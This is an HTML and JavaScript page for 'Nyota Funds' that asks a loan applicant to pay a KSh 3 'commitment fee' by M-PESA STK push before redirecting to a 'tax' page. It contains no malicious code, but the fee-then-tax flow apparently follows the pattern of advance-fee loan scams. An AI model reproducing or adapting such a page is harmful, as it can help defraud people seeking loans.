<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Customer Commitment Fee - Nyota Funds</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#e8f5e9;
    color:#222;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}

.card{
    width:100%;
    background:#fff;
    padding:22px 18px 18px;
    border-radius:18px;
    box-shadow:0 6px 24px rgba(0,0,0,0.10);
    border:1px solid #e8ece9;
}

h2{
    color:#176b2c;
    font-size:22px;
    font-weight:700;
    text-align:center;
    margin:2px 0 16px;
}

.success-box{
    background:#eaf7ed;
    color:#176b2c;
    padding:14px 12px;
    border-radius:12px;
    font-size:14px;
    line-height:1.5;
    text-align:center;
    margin-bottom:10px;
    border:1px solid #d5ecd9;
}

.details{
    background:#fafcfb;
    padding:15px;
    border-radius:13px;
    text-align:left;
    font-size:14px;
    border:1px solid #e5ebe7;
    margin-bottom:15px;
}

.details p{
    margin:9px 0;
    line-height:1.45;
}

.details b{
    color:#333;
}

.details span{
    color:#176b2c;
    font-weight:600;
}

button{
    width:100%;
    padding:15px;
    margin-top:5px;
    border:none;
    border-radius:11px;
    background:#176b2c;
    color:#fff;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    box-shadow:0 4px 10px rgba(23,107,44,0.20);
    transition:background .2s ease, transform .1s ease;
}

button:hover{
    background:#125823;
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:#9ca3a0;
    cursor:not-allowed;
    box-shadow:none;
}

#status{
    min-height:20px;
    margin-top:12px;
    text-align:center;
    font-size:13px;
    line-height:1.4;
    color:#555;
}

.secure{
    margin:13px 0 0;
    text-align:center;
    font-size:12px;
    color:#777;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h2{
        font-size:20px;
    }

    .details{
        padding:12px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}

</style>
</head>

<body>

<div class="container">

<div class="card">

<h2>Customer Commitment Fee</h2>

<div class="success-box">
Your NYOTA FUNDS application is almost complete.
</div>

<div class="details">

<p>
<b>Applicant:</b>
<span id="fullName">Loading...</span>
</p>

<p>
<b>Phone:</b>
<span id="phone">Loading...</span>
</p>

<p>
<b>Selected Fund:</b>
KSh <span id="fund">22,000</span>
</p>

<p>
<b>Commitment Fee:</b>
<span style="color:#1b5e20;font-weight:bold;">
KSh 3
</span>
</p>

</div>

<button id="payBtn" onclick="payCommitment()">
Pay Commitment Fee
</button>

<div id="status"></div>

<p class="secure">
🔒 Secure STK Push • Instant Confirmation
</p>

</div>

</div>


<script>

// ==========================================
// LOAD CUSTOMER DETAILS
// ==========================================

const fullName =
localStorage.getItem("fullName");

const phoneNumber =
localStorage.getItem("phoneNumber");

const selectedAmount =
localStorage.getItem("selectedAmount");


document.getElementById("fullName").textContent =
fullName || "Applicant";


document.getElementById("phone").textContent =
phoneNumber || "Not available";


document.getElementById("fund").textContent =
selectedAmount || "22,000";


// ==========================================
// PAY COMMITMENT FEE
// ==========================================

async function payCommitment(){

const phone =
localStorage.getItem("phoneNumber");

if(!phone){

document.getElementById("status").innerHTML =
"❌ Phone number not found. Please return to registration.";

return;

}

const btn =
document.getElementById("payBtn");

const status =
document.getElementById("status");


btn.disabled = true;

btn.innerHTML =
"Sending STK Push...";

status.innerHTML = "";


try{

const response = await fetch(
"https://nyota-funds-backend.onrender.com/stk-push",
{
method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

phone:phone,

// COMMITMENT FEE
amount:3

})
}
);


const data =
await response.json();

console.log("STK RESPONSE:",data);


// ==========================================
// CHECK FOR CHECKOUT ID
// ==========================================

const checkoutId =
data.checkout_request_id;


if(!checkoutId){

status.innerHTML =
"❌ STK Push could not be initiated.";

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

return;

}


// ==========================================
// STK SENT
// ==========================================

status.innerHTML =
"📱 STK Push sent successfully.<br>Please enter your M-PESA PIN.";


// ==========================================
// CHECK PAYMENT STATUS
// ==========================================

checkPayment(checkoutId);

}catch(error){

console.error(error);

status.innerHTML =
"❌ Unable to send STK Push. Please try again.";

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

}

}


// ==========================================
// PAYMENT STATUS CHECK
// ==========================================

async function checkPayment(checkoutId){

const interval =
setInterval(async()=>{

try{

const response = await fetch(
"https://nyota-funds-backend.onrender.com/payment-status",
{
method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

checkout_request_id:
checkoutId

})
}
);


const result =
await response.json();

console.log("PAYMENT STATUS:",result);


// ==========================================
// SUCCESS
// ==========================================

if(result.status === "completed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"✅ Commitment fee paid successfully.<br>Redirecting...";


setTimeout(()=>{

window.location.href =
"tax.html";

},1000);

}


// ==========================================
// FAILED
// ==========================================

else if(result.status === "failed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment failed.";

resetButton();

}


// ==========================================
// CANCELLED
// ==========================================

else if(result.status === "cancelled"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment cancelled.";

resetButton();

}

}catch(error){

console.error(
"Payment status error:",
error
);

}

},3000);

}


// ==========================================
// RESET BUTTON
// ==========================================

function resetButton(){

const btn =
document.getElementById("payBtn");

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

}

</script>

</body>
</html>
